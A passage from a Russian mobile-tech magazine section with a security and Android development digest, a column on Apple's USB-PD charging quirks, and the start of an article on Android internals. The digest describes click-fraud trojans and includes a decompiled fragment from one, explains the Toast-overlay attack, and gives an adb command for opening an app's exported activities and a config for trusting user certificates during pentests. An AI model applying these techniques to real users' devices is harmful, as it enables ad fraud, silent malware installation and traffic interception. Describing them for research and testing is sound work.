щений по этой ссылке, — около 3000.


                          Клик боты для Android
                                      Clicking Bot Applications — большая статья
                            о click fraud в среде Android, а если точ‐
                             нее —  о  зловредных  приложениях,
                              заража ющих смартфоны, чтобы незаметно
                               для пользователя  кликать по  рекламе.
                                Статья рас сматривает два типа подобных
                             приложений: те, что используют сервисы
                                        Accessibility для получения возможности
                              нажимать любые элементы интерфейса,
                             и те, что используют API ViewGroup.dis‐
                              patchTouchEvent,   позволяющий   при‐
                            ложению «кликнуть» на свои собственные
                               элементы, то есть на рекламу, которую оно
                            само же показывает.
                                Второй тип наиболее прос той и при‐
                              митивный. Рекламная сеть может легко
                               отследить его, просто анализируя, с какой
                             периодичностью делаются клики, по каким
                                час тям объявления, а также как они «выг‐
                                   лядят»: давление, площадь, длительность
                               нажатия и так далее.
                             Приложение, в свою очередь, может
    Четыре стадии трояна       попробовать обмануть рекламную  сеть:
                                сохранить параметры пос леднего нажатия
пользователя и применить их для нажатия по рекламе плюс раз бросать вре‐
мя нажатий. Кроме того, приложение может выбирать, с какой рекламной
сетью работать, а какую лучше оста вить в покое.
   Пример  получения  информа ции  о  клике  пользователя  в  трояне
com.life.read.physical.trian:


public class MainActivity extends SlidingFragmentActivity implements
View.OnClickListener, View.OnTouchListener {
    public boolean onTouch(View view, MotionEvent motionEvent) {
        if(motionEvent.getAction() == 0) {
            ClickSimulator.getMotionEventInfo(((Context)this), motion
Event);
        }
        return 0;
    }
    public class MotionEventInfo {
        public static MotionEventInfo setInfo(String name) {
            MotionEventInfo options;
            try {
                options = new MotionEventInfo();
                JSONObject JSON_Obj = new JSONObject(name);
                options.deviceId = JSON_Obj.optInt("de");
                options.pressure = JSON_Obj.optDouble("pr");
                options.size = JSON_Obj.optDouble("si");
                options.xprecision = JSON_Obj.optDouble("xp");
                options.yprecision = JSON_Obj.optDouble("yp");
                options.metaState = JSON_Obj.optInt("me");
                options.edgeFlags = JSON_Obj.optInt("ed");
            }
            catch(Exception ex) {
                options = null;
            }
            return options;
        }
    }
}

Первый тип click fraud приложений использует сервис Accessibility, который
позволяет изучать и нажимать на практичес ки любые час ти любых приложе‐
ний и самой системы. Такие приложения также могут приносить хозяину при‐
быль за счет установки рекламиру емых приложений (installation fraud).
  Однако у таких кликботов есть недостаток: они должны либо каким‐то
образом заставить пользователя включить свой сервис Accessibility, либо
использовать атаку Cloak & Dagger, чтобы включить его незаметно. К счастью,
немногие разработчики зловредов знают, как реализовать эту атаку.


Мал варь, использующая Toast-оверлеи
Toast Overlay Weaponized to Install Several Android Malware — рас сказ о мал‐
вари ANDROIDOS_TOASTAMIGO, первом трояне, использующем атаку Toast
overlay для незаметной пользователю установки приложений на смартфон.
   Toast overlay — атака, экс плуатирующая очень странную уяз вимость An‐
droid, которая позволяет засунуть полноэкранное окно в маленькое информа‐
ционное окошко, предназначенное для вывода информационных сообщений.
Троян использует такое окно, чтобы перекрыть экран, а в это время открыть
настройки и заставить пользователя нажать на определенные мес та (нажатие
будет  проходить  «сквозь»  окно),  активируя  таким  образом  сервис
Accessibility.
   Затем, используя ана логичный трюк, тро ян вклю чает опцию, позволя ющую
инсталлировать приложения из сто ронних источников, скачивает и устанав‐
ливает на смартфон другой зловред и завершает анти виру сы. Скачанный
зловред, в свою очередь, представляет собой кликбот. Интересно, что он
умеет устанавливать соединение с прокси‐сервером, чтобы обойти реги‐
ональные ограничения на доступность рекламных сетей AdMob и Facebook.
   Стоит отметить, что уязвимость Toast overlay была исправлена в сентябрь‐
ском обновлении Android.





                 Принцип работы атаки Toast overlay


Взлом приложе ний через экспортирован ные компонен ты
Hack Android Application Through Exposed Components — хорошая вводная
статья о том, как взламывать приложения для Android с помощью торчащих
наружу компонен тов приложения: активностей, сервисов, intent‐ресиверов,
content‐провайдеров.
   Статья объясняет назначение каж дого компонента, а затем на при мере
уязвимого  приложения  показывает,   как  распотрошить  приложение
с помощью apktool, а затем использовать инс трумент Drozer, чтобы найти
экспортированные компоненты.
   Один из примеров — запуск скрытой активности напрямую, чтобы увидеть
список сохраненных приложений:


adb shell am start ‐n <package_name>/<activity_name>


Иссле дование внутренней струк туры бэкапов iOS
Reverse Engineering the iOS Backup — исследова ние формата бэкапов iOS.
Никаких откровений, просто список файлов, их содержимое и назначение.
Можно добавить в закладки и открывать в случае необ ходимости.
   Спойлер: фактически весь бэкап состоит из чита емых с помощью обыч‐
ного редактора файлов  .plist и баз данных SQLite, которые можно прос‐
мотреть с помощью любого менеджера БД.


Как заставить приложе ния доверять левым сертификатам
Bypassing Android’s Network Security Conﬁguration — как обойти дефолтовый
сетевой security‐конфиг приложения, чтобы выполнить пентест.
  В Android 7 появился механизм, наз ванный Network Security Conﬁguration.
Он позволяет программистам изменять нас трой ки безопасности подклю‐
чения к сети через специальный XML‐файл внутри APK. Этот же механизм
заставляет все приложения, собранные для Android 7 и выше, доверять толь‐
ко системным сер тификатам и, как следствие, не поз воляет подсунуть собс‐
твенный сертификат, чтобы выполнить ана лиз трафика.
   Автор статьи предлагает два варианта решения этой проблемы: пересоб‐
рать приложе ние, добавив в него собс твенный security‐конфиг, или исполь‐
зовать Frida, чтобы на лету модифицировать поведение Android в отношении
данного приложения. Первый способ намного проще, но он не подойдет,
если необходимо сохранить оригинальную цифровую подпись приложения
(например, в случае, ког да два приложения используют один приватный
каталог).
   Конфиг, заставляющий приложение доверять уста новленным пользовате‐
лем сертификатам:


<?xml version="1.0" encoding="utf‐8"?>
<network‐security‐config>
    <base‐config>
        <trust‐anchors>
            <certificates src="system"/>
            <certificates src="user"/>
        </trust‐anchors>
    </base‐config>
</network‐security‐config>


ARM Cheatsheet





СКАЧАТЬ
LineageOS for microG — сборка LineageOS (кастомной прошивки Android)
со встроенными сервисами microG и маркетом F‐Droid. Инте ресна она тем,
что позволяет получить доступ к сервисам Google, не устанавливая на смар‐
тфон сами сервисы Google.
   Зачем это нужно? Все просто: если ты прошьешь на смартфон стандар‐
тную сборку LineageOS, у тебя не будет доступа ни к маркету, ни к картам
Google, а приложения не смогут получать push‐уведомления. Чтобы все
это заработало, нужно установить так называемый пакет GApps, содержащий
сервисы Google.
   Проблема в том, что даже минимальный вари ант GApps весит боль‐
ше 120 Мбайт, а полный — более 700 Мбайт. Также сервисы Google из GApps
славятся своей любовью к оперативке и заряду батареи. А еще они закрыты,
то есть о том, что они могут делать, зна ет только сама Google.
   MicroG, с другой стороны, открыты, весят всего четыре мега, не выжирают
батарею и почти ничего не занимают в памяти. Говорят, что на microG можно
запустить даже Play Маркет, но эту информацию я не проверял.


ПРОГРАММИРОВАНИЕ
Google и Kotlin
Update on Kotlin for Android — Google отчиталась о трех важных вещах, связан‐
ных с Kotlin.
 1. Они подготовили гайд по стилю кодирования на Kotlin. Ничего особо при‐
   мечательного в нем нет, почти такие же рекомендации, как в слу чае с Java:
   всегда использовать фигурные скоб ки в  if, ста вить пробел после  if, for
   и catch, не разделять про белом имя объекта и метода и тому подобное.
 2. Они портировали некото рые свои примеры при ложений на Kotlin.
 3. Добавили null‐аннотации в 27‐ю вер сию Support Library. Так что теперь
    Kotlin‐программисты будут знать, является ли значение, возвращаемое
   стандартными библиотеками Google, nullable или нет.


Не оче вид ные воз можности Kotlin
Advanced Kotlin tips — очередная подборка интерес ных, но неочевидных воз‐
можностей Kotlin. О некоторых из них мы уже рас сказывали в прошлом выпус‐
ке: о локальных, инфиксных, инлайновых функциях, метках return. Из нового:
 • Ключевое слово tilerec — позволя ет указать компилятору, что сле‐
   дующая функция вызывает себя и только себя (другими словами, она
   рекурсивная). Это позволяет применить оптимиза ции, заменя ющие вызов
   метода на цикл:


   tailrec fun findFixPoint(x: Double = 1.0): Double
           = if (x == Math.cos(x)) x else findFixPoint(Math.cos(x))

 • Перегрузка операторов. Без комментариев:


   operator fun plus(time: Time) {
       ...
   }
   time1 + time2


Простые советы по написанию луч шего кода
Simple but painful steps for writing a better code — четыре крайне прос тых,
но действенных совета.
  Со вет первый: прек рати соз давать объ екты внутри под собных
классов. Например, класс ниже невозможно тестировать:


class VehiclesManager(val context: Context) {
    fun getVehiclesNextToMe(): List<Vehicle> {
        val api = VehiclesRetrofitApi(context)
        val currentLocation = LocationProvider.currentLocation()
        return api.getVehicles()
            .filter { it.coordinates.distanceTo(currentLocation) <
100 }
    }
}

Ему не нужен Context (ему нужен объект класса VehiclesRetroﬁtApi). Он намер‐
тво привязан к библиотеке Retroﬁt. Правиль ный вариант:


class VehiclesManager(val vehiclesApi: VehiclesRetrofitApi) {
    fun getVehiclesNextToMe(): List<Vehicle> {
        val currentLocation = LocationProvider.currentLocation()
        return vehiclesApi.getVehicles()
            .filter { it.coordinates.distanceTo(currentLocation) <
100 }
    }
}

  Со вет вто рой: не вызывай синглто ны напрямую. Передавай их
как параметр конструкторам классов.
  Со вет тре тий: перестань называть свои классы Manager, Han-
dler, Controller и Processor. Такие слова в именах не несут никакого
смысла, без них имя класса будет более понятным.
  Со вет  четвертый:  перестань  пло дить  классы‑наследники.
Во многих случаях это делает код менее читаемым и понятным.


10 биб лиотек, которые сле дует обязательно попробовать
10 Awesome Android libraries you deﬁnitely want to try. Чес тно говоря, эту статью
надо видеть вживую, наслаждаясь прекрасны ми анимированными скрин‐
шотами, но все‐таки сделаем небольшую выжимку:
 1. Lottie — библиотека получает на вход анимацию в формате Adobe After Ef‐
    fects и рендерит ее с помощью стандартных механизмов Android.
 2. StyleableToast — библиотека для показа кастомизируемых Toast‐сооб‐
   щений.
 3. CoordinatorTabLayout — смесь TabLayout и CoordinatorLayout.
 4. Material About — эффектный экран «Обо мне».
 5. SlidingRootNav — боковое меню (drawer) с интерес ным эффектом появ‐
   ления.
 6. InﬁniteCycleViewPager — ViewPager с эффектом переключения View.
 7. JazzyViewPager — еще один ViewPager с различными эффектами перек‐
   лючения.
 8. Side‐Menu.Android — боковое меню для выбора категорий.
 9. AwesomeBar — ActionBar + Drawer с красивыми эффектами.
10. ShimmerRecyclerView —  RecyclerView с показом  загрузки элементов
   с помощью эффекта мерцания.


Зависимость количества установок от раз мера приложе ния
Shrinking APKs, growing installs — интерес ное исследование, посвященное
влиянию размера приложения на желание поль зователей его установить.
Авторы выяснили,  что каждое увеличение раз мера на 6 Мбайт ведет
к падению количества уста новок на 1%. Причем в 30% случаев (для при ложе‐
ния размером 100 Мбайт) не отка зываются от установки как таковой, а отме‐
няют уже начавшуюся уста новку.
  В первую очередь такие результаты свя заны с недос тупностью качествен‐
ного интернета во многих местах планеты. Например, в Индии и Индонезии
только 50% пользователей смартфонов имеют доступ к Wi‐Fi. В африканских
странах еще меньше.





  Зависимость желания установить приложение от снижения размера APK
  на 10 Мбайт


История изме нений Android 4.0–8.1
AndroidSDKPoster — огромный настенный пос тер с историей изменений An‐
droid SDK 14–27. Смотреть в онлайне бес полезно, необходимо распечаты‐
вать PDF и вешать на стену. Раз меры: A0 и A1.


Биб лиоте ки
 • Time — простая Kotlin‐библиотека, позволяющая писать 10.seconds
   вместо 10 * 1000, а также 10.hours, 5.minutes и так далее;
 • DownZ — HTTP‐библиотека с воз можностью кеширования JSON и изоб‐
   ражений, отменой заг рузки или выгрузки изоб ражений;
 • RippleLayout — лейаут, создающий эффект волн на воде при прикос‐
   новении к любой своей час ти;
 • FastTextView — более быстрый и гибкий ана лог TextView;
 • android‐extensions — набор функций рас ширений для более эффективного
   программирования на Kotlin;
 • circle‐menu‐android —  красивое прекрасно анимированное  круговое
   меню;
 • CircularDialogs — анимированные круговые диалоги;
 • Serial — быстрая эффективная биб лиотека сериализации объектов
   (автор — Twitter);
 • PRDownloader — загрузчик файлов с функциями паузы, возобновления
   и одновременной загрузки.
X‐MOBILE

 КАК APPLE ОБХОДИТ
    СТАНДАРТЫ,
  ЗАСТАВЛЯЯ ТЕБЯ
      ПЛАТИТЬ





                                        Олег Афонин
                                          Эксперт по мобильной
                                        криминалистике компании
                                             «Элкомсофт»
                                             aoleg@voicecallcentral.com




      КОЛОНКА ОЛЕГА АФОНИНА





Иногда сложные вещи начина ются с простых: планшет
iPad Pro 10.5 вдруг перестал заряжаться от сторон него блока
питания с поддержкой стандарта USB PD. Исследование
этого маленького инцидента привело меня в мир хаоса, где
Apple полностью следует стандартам, но весьма хитрыми
способами делает это так, что устройства и перифе рия час‐
то несовместимы даже между разными моделями устройств
самой компании.


Началось все с того, что с очередным обновлением iOS от сторонних блоков
с выходом USB‐C и поддержкой Power  Delivery перес тал  заряжаться
iPad Pro 10.5. Раньше работа ло, потом — перестало; так бывает. Пос ле появ‐
ления iOS 11.2 планшет вновь обрел возможность заряжаться от сторонних
блоков с выходом USB‐C, но работа ет про цесс через раз, а скорость заряда
оставляет желать лучшего.
  Простейшая ситуация, которую мож но испра вить заменой блока питания?
Не вышло: ни один из сто ронних адап теров, выполненных по стандарту USB
Power Delivery, не смог быс тро, а главное стабиль но, а не через раз, спра‐
виться со своей задачей. Неужели все сторонние производите ли, включая
небезызвестную Delta (между прочим, некоторые модели зарядок для Apple
выпускает именно она, а блоки питания собс твенной разработки продает
под торговой маркой Innergie), так гру бо нарушают стандарт USB Power
Delivery?
  Все оказалось сложнее.
  Немного предыстории. В предыдущем материале на тему зарядных
устройств мы приводили ссылку на инженера Google Бенсона Люня, который
на добровольных началах взялся за тестирование кабелей и зарядных
устройств стандарта USB‐C. Все закончилось тем, что оче редной кабель сжег
хромбук Бенсона. На смену Бенсону Люню  пришел  другой инже нер
из Google — Nathan K., который с энтузиазмом принялся за тестирование.
Его страница в Google Plus.
  Натан тестирует зарядки и провода USB‐C. Забегая вперед, скажу, что
Натан тоже сжег свой компьютер — как и Бенсон в свое вре мя Pixelbook.
Из нескольких десятков протестированных устройств соответствующими
стандартам оказались буквально два или три, вклю чая одну довольно старую
зарядку Innergie (Delta).


        WWW

                    Ин тересующихся техническими деталями отсы‐
                     лаем на страницы с оригинальными постинга ми
                       Nathan K.: раз и два.


Итоги исследования Натана: пло хо — буквально всё. Все сущес твующие
зарядки (кроме Google), всё, что сделала Apple (ассоциация USB‐IF будет
запрещать ЗУ Apple начиная с 1 января 2018 года), всевозможные Aukey...
Вот Qualcomm, как ни странно, со сво им Quick Charge 4.0 угадала: их пока
не запрещают (скорее всего, потому, что их прос то нет на рынке). Зато все
без исключения ЗУ с выходом USB‐C и с поддержкой предыдущей версии
Quick Charge 3.0 — официальные наруши тели.



      Apple has until Jan 1 2018 to stop supporting their previously allowed by
       4.8.2 charging methods in their Macs and i-Devices, and until Jan 1 2019
       to stop supporting it for their new chargers. As for QC 2 and 3, those were
       never allowed to begin with on a Type-C connector  if they changed volt-
      age to beyond default usb levels.

В этот момент у меня начало закрадываться подозрение, что это не произво‐
дители такие, а стандарт такой. За все время существования Qualcomm Quick
Charge 2.0 и 3.0 я ни разу не слышал о случаях систематической несовмести‐
мости зарядных и заряжа емых устройств. Чтобы зарядка QC 3.0 не работала
со смартфоном QC 2.0 или 3.0? Не было такого, разве что возможен брак
в отдельном устройстве. Другое дело, что Quick Charge довольно плохо мас‐
штабируется на компьютеры и ноутбуки...
  А что же Apple, участник консорциума USB‐IF и один из родоначальников
как стандарта USB‐C, так и протокола Power Delivery? Почему iPad Pro
10.5 не заряжается от сто ронних зарядных устройств с выходом USB‐C, хотя,
по идее, должен?
  Ответ здесь сложнее, чем кажется. Посмотрим внимательно на блок
питания на 29 Вт, который нам предлагает сама компания Apple.





Этот блок — безумие сразу с нес кольких точек зрения. Положительные сто‐
роны этого блока питания — исключительный подход к безопасности. Этот
блок ни при каких обсто ятельствах не загорится и не повредит устройство,
к которому его подклю чают. Туда встро ено столько разнообразных защитных
механизмов,  что они занимают боль шую  часть объема зарядки. КПД
и эффективность — запредельные; этот БП практически не греется даже
при отдаче полной паспортной мощности. Я тестировал два зарядных устрой‐
ства — клона ЗУ от Apple (одно совсем безымянное, второе под маркой
Auckly — не путать с Aukey, 45‐ваттный блок которой также тестировал ся
и также не заработал); силь ный нагрев и высоко частотный писк — лишь
самое начало проб лем.
   Эти блоки питания не заряжают iPad Pro (ток 0,5 А при напряжении 5 В).





А этот — заряжает (про филь USB PD, но: силь ный нагрев, высокочастотный
писк, внутри что‐то перекатывается).





В ЗУ от Apple установлен «умный» контрол лер, который может не только
получать данные от под клю ченного устройства, но и обновить собственную
прошивку, а в теории еще и пошпионить за поль зователем. Единс твенное
подобное решение — штатное ЗУ от пос леднего Google Pixelbook 2017.
И  последнее. В  Apple  используют  рас ширение  спецификации  Power
Delivery —  «кастомные протоколы»: USB PD не определяет профиль
на 14,5 В (есть только 15 В), а именно по этому профилю должны заряжаться
iPad Pro 10.5, 12.9 и 12.9 (2017).
   Если бы Apple выпустила блок питания такого качес тва, но соответству‐
ющий стандарту USB Power Delivery, за него не жалко было бы любых денег,
а конкурентам осталось бы тихо уйти с рын ка. К сожалению, 29‐ваттный блок
питания Apple определя ет лишь следующие про фили: 14,5 В / 2 А (рас‐
ширение USB‐PD) и 5,2 В / 2,4 А (с какой стороны это относится к стан‐
дарту — загадка).
  Проблема не только в ста рень ком БП на 29 Вт, который был «grandfa‐
thered» консорциумом USB‐IF в знак уважения к одному из родоначальников
стандарта PD. Проб лема в том, что у Apple (см. выше про «одного из родона‐
чальников») нет ни одного (!) зарядного устройства, которое соответс тво‐
вало бы стандарту USB Power Delivery, — и это при том, что работают все ЗУ
от Apple (с выходом USB‐C) исключительно в соот ветс твии с буквой стан‐
дарта! Да‐да, даже устройство 29 Вт, в котором нет ни одного стандартного
профиля USB Power Delivery, выполнено в букваль ном соответствии стан‐
дарту! Как это возможно? В Apple решили исполь зовать собственное рас‐
ширение стандарта — дополнительный про филь Power Delivery, который чет‐
ко определяется согласно рас ширению стандарта PD custom  charging.
Получилось совершенно изу мительно: зарядное устройство, полностью соот‐
ветствующее (существовавшему в момент выхода) стандарту — но тол ком
не совместимое ни с одним устройством, кро ме собственно Apple.
   Что это означает на практике? Зарядкой Apple на 61 Вт или 87 Вт ты смо‐
жешь заряжать iPad Pro 10.5, но заряжаться он будет МЕДЛЕННО! А вот
от зарядки на 29 Вт — быстро. Почему? Потому что в тех, что на 61 Вт и 87 Вт,
отсутствует нужный профиль PD (14,5 В / 2 А), а в той, что на 29 Вт, — при‐
сутствует. Это не было кримина лом, когда стандарт PD только выходил, но на
сегодняшний день представляет собой нарушение последней ревизии стан‐
дарта (по стандарту PD, все зарядки с большей мощностью дол жны обладать
всеми профилями зарядок с мень шей мощ ностью — на практике это не соб‐
людается).
   Как это работает? Возьмем зарядное устройство Apple с выход ной мощ‐
ностью 61 Вт. Устрой ство поддерживает следующие профили: 20,3 В — 3
A (USB PD), 9 В — 3 A (USB PD), 5,2 В — 2,4 A. В USB PD в качестве стандар‐
тных профилей прописаны 5 В / 3 А, 9 В / 3 А, 15 В / 3 А, 20 В / 3 А. Замечаешь
несоответствие? Требование стандарта проистекает из простой логики: если
пользователь покупает более мощное зарядное устройство, то он сможет
с его помощью заряжать ВСЕ устройства, которые требуют меньшей мощ‐
ности, — и не задумываться о том, какое напряжение и сила тока для этого
нужны. Логично?
   Нет! У Apple другая логика: все должно быть просто и понятно и работать
«одним кликом». По «однокликовой» логике Apple, имеется следующая мат‐
рица того, как имен но и с какой скоростью будет заряжаться iPad Pro
10.5 и iPad Pro 12.9 (2017) от раз ных ЗУ:
 • комплектная зарядка (выход USB‐A): 12 Вт (5 В / 2,4 A);
 • сторонние бло ки питания USB‐C PD: 18 Вт (9 В / 2 А), но срабатывает
   через раз из‐за того, что Apple использует ряд нестандартных решений
   (там некоторый бардак в электричес кой части, связанный с обратной сов‐
   местимостью);
 • блок Apple 29W: 29 Вт (по про филю 14,5 В / 2 А);
 • блоки Apple 61W, 87W: 18 Вт (по профилю 9 В / 2 А, так как профиля
   на 14,5 или 15 В в них прос то нет).

Таким образом, для любого пользователя пос ледних моделей iPad Pro дол‐
жно быть совершенно очевидно, что 29 Вт — это 29 Вт, а 61 или 87 — это 18.
  Вишенка на торте: на сайте самой Apple в качес тве ЗУ, поддерживающих
быструю зарядку для iPad Pro 10.5, перечислены все три — на 29, 61 и 87 Вт.
  На то, чтобы получить эту информа цию, я убил три вечера чтения исклю‐
чительно технических форумов. Наверное, моя логика работает как‐то не так.


И СНОВА О ПРОПРИЕТАРНЫХ СТАНДАРТАХ
Так что же получается, открытый стандарт USB Power Delivery — зло, раз уж
никто, даже почетные члены консорциума, не в состоянии выпустить пол‐
ностью совместимые устройства?
  Ничуть. Проблема здесь именно в проприетарных стандартах. Устройства
под управлением iOS используют закрытый разъ ем Lightning. Каким образом
сделана коммутация этого (ста рого уже по современным меркам) разъема
с современным стандартом USB‐C? По сути, в фирменный шнур USB‐C —
Lightning встроен переходник с USB‐C на USB‐A, пос ле чего, что называется,
«задача решена». Но ведь хочется заряжаться быс трее, при чем по стандарту
USB PD, который не должен работать поверх USB‐A! Как обычно, в Apple пош‐
ли своим путем и в кабель USB‐C — Lightning встроили абсолютно проп‐
риетарный контрол лер, который и договарива ется с зарядным устройством.
При этом контроллер ограничивает максимальный передаваемый по кабелю
ток значением 2 А.
   Дальше — больше. Ска зать, что iPad Pro 10.5 совсем не поддерживает
зарядные устройства USB PD, нельзя: договарива ются о напряжении и токе
заряда устройства именно по это му протоколу. Но... в спецификации USB PD
отсутствует профиль с напряжением 14,5 В! Соответственно, в зарядных
устройствах не Apple его просто нет (точнее, не дол жно быть)!
   Дальше мы вступаем на тонкий лед спекуляций, собирая по кру пицам
информацию, которой делились пользователи. Соз дается впе чатление, что
до iOS 11.0.2 включительно в Apple закрывали гла за на не совсем соответс‐
твующее напряжение заряда и соглашались заряжаться от стандартного
для USB PD профиля 15 В / 2 A (фактически потребляя 14,8 В / 1,95 A сог‐
ласно отчетам исследова телей). Потом эту возможность отключили, оставив
PD только с фирменной зарядкой Apple, причем только и исключительно ЗУ
Apple на 29 Вт.
  И наконец, похоже, что в iOS 11.2 включили обратно профиль PD на 9 В:
теперь устройство соглаша ется заряжать ся по протоколу USB PD по про‐
филю с напряжением 9 В (но с ограничением силы тока 2 А). Таким образом,
сторонние ЗУ, выпол ненные в полном соответствии спецификации USB Pow‐
er  Delivery, способ ны заряжать новые  iPad  Pro с максимальной мощ‐
ностью 18 Вт, а ЗУ Apple 29 Вт — на полной мощности по профилю 14,5 В /
2 А.


КИТАЙ ПРОТИВ ПРОПРИЕТАРНЫХ СТАНДАРТОВ
На самом деле тот ужас, который творит Apple, — это цветочки. Apple хотя бы
придерживается буквы стандартного протоко ла. То, что выпус кают китай ские
производители, вооб ще за пределами доб ра и зла. Так, на контактах D+/D‐
китайских ЗУ может быть напряжение (чтобы общаться по протоколам «ста‐
рого» Apple и Quick Charge); из‐за этого, в час тности, при попытке заряжать
такими блоками питания планшет iPad Pro 10.5 устрой ство посчитает, что оно
подклю чено не к ЗУ, а к компьютеру, и заряжать ся будет током 0,5 А — то есть
вообще практически не будет заряжать ся, с его‐то акку муля тором.


А зна ешь ли ты?..
А известно ли тебе, что устройства Apple точно идентифици руют подключен‐
ное зарядное устрой ство? Что iPad, что Macbook различают фирменные
зарядки Apple; зарядки, которые подделыва ются под фирменные ЗУ Apple;
сторонние ЗУ, соот ветствующие протоколу PD, и сто ронние ЗУ, выпол ненные
с нарушениями протоко ла. Соответс твенно, в каждом конкретном слу чае
устройство может выбрать, по какому про филю оно будет заряжаться.



ВЫВОДЫ
Какие выводы можно сделать из ситуации с зарядными устройствами? Вывод
о том, что Apple развела на ровном мес те жуткий бардак, я оставлю в сто‐
роне.
  С iPhone 8, 8 Plus и X идут классичес кие адап теры на 1 А класса «выб‐
росить вместе с коробкой», которые способ ны заряжать устройства мощ‐
ностью 5 Вт. С iPad и iPad Pro уже лучше — там поставляется блок
питания 12 Вт, но исключитель но потому, что от стандартного блока на 5 Вт
устройство не станет заряжать ся совсем. Заряжа ют эти блоки питания
с параметрами 5 В / 2,4 А.
   Блок питания на 29 Вт идет в комплекте с Macbook (12"), но можно купить
и отдельно (и за немалень кие деньги). Еще потребуется кабель USB‐C —
Lightning, который тоже стоит удивитель ных денег.
  Вывод о том, что Apple — исключитель но жадная компания, положившая
неадекватные блоки питания в комплект с iPad Pro 10.5, 12.9, а также iPhone 8,
8 Plus и X, я тоже делать не буду: желание компании заработать на каждой
мелочи давно известно.
  Правильный вывод: для зарядки iPad Pro 10.5 и 12.9 (2017), а также пос‐
леднего поколения iPhone нужно покупать БП Apple на 29  Вт. А вот
iPad 12.9 первого поколения (2015 года) прекрасно заряжается от сторонних
зарядок, включая зарядку от Xiaomi по про филю 15 В / 2 А!
X‐MOBILE
 ПЯТЬ СТОЛПОВ
      ANDROID


                        ТЕХНОЛОГИИ,
                ЛЕЖАЩИЕ В ОСНОВЕ
            САМОЙ ПОПУЛЯРНОЙ ОС





                                                                              Евгений Зобнин
                                                                                    Редактор Unixoid и Mobile
                                                                                                  zobnin@glc.ru





Существует как минимум пять тех нологий, которые делают
Android именно тем, чем мы привык ли его видеть: виртуаль‐
ная машина, сис тема многозадачности, сервисы Google,
IPC‐механизм Binder и ядро Linux. Каждая из этих подсистем
имеет свою историю развития, свои причины появления
и наделяет Android присущими ему широкими возможнос‐
тями. Мы в подробностях поговорим о каждой из них
и покажем, почему Android — это нечто гораздо большее,
чем мобильная ОС.


ВИРТУАЛЬНАЯ МАШИНА
Принято считать, что в основе Android лежит Java. Дескать, именно поэтому
ОС такая тре бовательная к процес сору и оперативной памяти. На самом
деле все намного сложнее. Java (а теперь и Kotlin) — это дей ствительно офи‐
циальный язык Android. Но Java — это не только язык, но и среда исполнения.
  В случае обычной  Java, разработанной компанией Sun (теперь уже
Oracle), приложения ком пилиру ются в специаль ный промежу точный байт‐код,
который затем исполняет виртуальная машина. Самые ранние версии вир‐
туальной машины делали это путем интерпретации: ВМ читала байт‐код, ана‐
лизировала записанные в нем инс трукции и исполняла их.
   Это медленный метод исполнения (на каж дую инс трукцию ВМ могли ухо‐
дить десятки и сотни машин ных инструкций), поэто му позднее появился так
называемый JIT‐компилятор (Just In Time compiler). С его помощью виртуаль‐
ная машина могла на лету перегонять байт‐код в машинные инструкции, что
существенно подняло скорость его исполнения, но повысило рас ход опе‐
ративной памяти: в памяти теперь необ ходимо хра нить не только байт‐код,
но и полученные из него машинные инс трукции плюс метаданные, позволя‐
ющие выполнять оптимиза ции.
  Кроме того, при раз работке виртуальной машины Джеймс Гос линг решил
использовать стековый дизайн виртуальной машины, как простой и универ‐
сальный. Но  существует  более  эффективный  в  скорос ти  исполнения
байт‐кода  и  потребления  оперативной  памяти  дизайн  виртуальной
машины — регистровый.
  Именно такая регистровая вир туальная машина (под названием Dalvik)
использовалась в первых версиях Android. Благодаря отсутствию JIT‐ком‐
пилятора она была очень нетребова тельной к оперативной памяти, а регис‐
тровый дизайн позволял исполнять приложения достаточно быстро даже
в режиме интерпретации.





  Среда разработки Android компилирует код Java в байт‐код JVM,
  но затем конвертирует его в байт‐код Dalvik

Однако в Android 2.2 Google все‐таки реализовала JIT‐компилятор и долго
хвасталась  графиками  многократного  прирос та  производительности.
На деле же скорость воз росла нез начительно, все самые тре бовательные
к ресурсам API Android и так были реализова ны на C++, который исполнялся
напрямую на процессоре. Почти все тяжеловес ные игры также использовали
код на C/C++ и других компилиру емых в машин ные инструкции языках.
  В Android 5.0 Google пошла еще дальше и заменила Dalvik на AOT‐ком‐
пилятор (Ahead Of Time compiler) под названием ART. В теории такой ком‐
пилятор  позволяет  изба виться  от  виртуаль ной машины  как сущности
и переводить приложение в машинные инструкции еще на этапе установки.
На деле же получалось так, что не весь байт‐код можно было одним махом
сконвертировать в инструкции про цес сора, и результирующий код мог
содержать как машин ные инс трукции, так и байт‐код старого доброго Dalvik.
И со всей этой мешаниной продолжала разбирать ся виртуальная машина.
   AOT‐компилятор также проигрывал JIT‐компилятору в возможностях опти‐
мизации машинного кода. У него прос то не было достаточно информации
о поведении приложения и особен ностях его работы; ее можно было
получить, только запустив приложение. И он сущес твенно замедлял установку
приложений и первый запуск операционной сис темы.
   Чтобы это исправить, в Android 7 Google решила использовать гибридный
JIT/AOT‐компилятор.  Сразу  пос ле  установки  приложение  исполняется
с использованием JIT‐компилятора, но во время работы от зарядки смартфон
перегоняет приложение в машинные инструкции с помощью AOT‐компилято‐
ра, который может учитывать информа цию, накопленную в процесс исполне‐
ния приложения.
  А теперь вопрос: зачем Google нуж ны были все эти заморочки с Java
и виртуальными машинами, ког да мож но было пойти по пути Apple и исполь‐
зовать обычный, компилируемый в машин ные инструкции язык, который
не страдает от проб лем с жором оперативки и производительности?
  Ответов на этот вопрос как минимум два.
 1. Портабельность. Помнишь сло ган Java: «Написа но однажды — работает
   везде»? А ведь это не маркетин говый булшит, это чис тая правда. Ты
  можешь скачать любое когда‐либо написанное на Java при ложе ние
   и запустить его на любой полноценной виртуаль ной машине Java незави‐
  симо от операционной системы, архи тек туры процес сора и фазы луны.
  Оно просто работает.
     Тем же принципом руководствовались раз работчики Android. Неважно,
   на каком процессоре основан смартфон, неважно, смартфон это или
   телевизор. Приложение, написанное для Android, будет на нем работать
   без  всяких  перекомпиляций  и  модификаций  (если,  конечно,  оно
   не использует машин ный код на C/C++).
    Мало того — разработчику даже не нужно задумы ваться о поддержке
   более эффектив ных инструкций, появившихся в новых процессорах,
   за него это сделает виртуальная машина.
 2. Надеж ность. Java — это высоко уровневый язык со сборщиком мусора,
   не позволяющий адресовать память напрямую и не требующий самос‐
   тоятельного освобож дения выделен ной памяти. Это значит, что многие
   типы атак, включая buﬀer overﬂow и use after free, против приложений
   на Java не могут быть реализованы. В край нем слу чае виртуальная
  машина  просто  убьет  приложение  (как  это  неред ко  происходит
   при выходе за границы массива, например). Именно поэтому в Android
   в целом находят меньше уязвимос тей, чем в iOS, полностью написанной
   на небезопасных языках C, C++ и Objective‐C. И это одна из причин,
